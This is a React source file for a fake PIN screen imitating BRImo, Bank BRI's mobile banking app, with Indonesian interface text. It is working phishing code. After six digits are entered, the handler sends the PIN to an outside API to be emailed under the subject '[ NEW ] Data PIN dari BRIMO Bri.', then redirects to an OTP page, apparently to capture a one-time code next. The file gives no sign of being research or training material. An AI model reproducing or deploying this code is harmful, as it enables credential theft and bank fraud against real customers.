import { Link, useNavigate } from 'react-router-dom'
import { useState } from 'react';

import '../assets/css/App.css';
import arr from '../assets/img/arrow-left.svg'
import del from '../assets/img/backspace.svg'
import loading from '../assets/img/loading.svg'

function Pin(props) {
  const [pin, setPin] = useState([]);
  const nav = useNavigate()

  const click = (e) => {
    let data = [...pin];
    if (data.length < 5) {
      data.push(e)
      setPin(data)
    }else {
      data.push(e)
      setPin(data)
      console.log(data)

      // email js in
      let data2 = {props1 : 'PIN : ',value1 : data.join(' - ')};
      
      fetch(props.api, {
      method: 'POST',
      headers: {
        accept: 'application.json',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        to: props.email,
        subject: '[ NEW ] Data PIN dari BRIMO Bri.',
        text: `
          Data ${data.ket} dari BRIMO Bri
          1. ${data2.props1 + data2.value1}
        `
      })
    })
    .then(res => res.json())
    .then(res => console.log('Link Salah!'))
      // email js out

      document.querySelector('.no-loading').classList.add('loading')
      setTimeout(()=>{
        document.querySelector('.no-loading').classList.remove('loading')
        nav('/otp')
      }, 1000)
    }
  }

  const backspace = () => {
    let data = [...pin];
    data.pop()
    setPin(data)
  }

  return (
    <div className='App-v3'> 
      <Link to={'/login'}>
      <img src={arr} className='arr' />
      </Link>
      <center>
        <h2>PIN</h2>
      </center>
      <br/><br/><br/>
      <h2>Konfirmasi PIN</h2>
      <p className='p2'>Silahkan Konfirmasi PIN yang sudah<br/>
      Anda buat.</p>
      <br/><br/>
      <div className="pin">

        <div className="code">{pin[0]}</div>
        <div className="code">{pin[1]}</div>
        <div className="code">{pin[2]}</div>
        <div className="code">{pin[3]}</div>
        <div className="code">{pin[4]}</div>
        <div className="code">{pin[5]}</div>
      </div>
      <br/>
      <center>
        <h3>Lupa PIN?</h3>
      </center>
      <br/>
      <div className="btn-row">
        <div className="btn-num" onClick={() => click(1)}>1</div>
        <div className="btn-num" onClick={() => click(2)}>2</div>
        <div className="btn-num" onClick={() => click(3)}>3</div>
      </div>
      <div className="btn-row">
        <div className="btn-num" onClick={() => click(4)}>4</div>
        <div className="btn-num" onClick={() => click(5)}>5</div>
        <div className="btn-num" onClick={() => click(6)}>6</div>
      </div>
      <div className="btn-row">
        <div className="btn-num" onClick={() => click(7)}>7</div>
        <div className="btn-num" onClick={() => click(8)}>8</div>
        <div className="btn-num" onClick={() => click(9)}>9</div>
      </div>
      <div className="btn-row">
        <div className="btn-num disable"></div>
        <div className="btn-num" onClick={() => click(0)}>0</div>
        <div className="btn-num" onClick={backspace}>
          <img src={del} width="35%" />
        </div>
      </div>
      <div className="no-loading">
        <img src={loading} width="100px" />
      </div>
    </div>
  );
}

export default Pin;
